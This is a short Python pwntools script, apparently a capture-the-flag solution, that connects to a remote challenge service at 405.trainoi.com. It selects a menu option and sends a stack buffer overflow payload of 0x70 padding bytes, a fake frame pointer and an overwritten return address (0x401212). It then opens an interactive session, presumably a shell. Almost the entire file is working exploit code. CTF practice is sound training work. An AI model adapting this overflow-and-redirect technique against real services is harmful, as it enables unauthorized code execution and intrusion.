from pwn import *

# io = process('./pwn')
io = remote('405.trainoi.com', 27111)

payload = flat([b'A' * 0x70, p64(0xcafebabe), p64(0x401212)])

print(io.recvuntil(b'Exit\n').decode().strip())
io.sendline(b'1')
io.sendline(payload)

io.interactive()
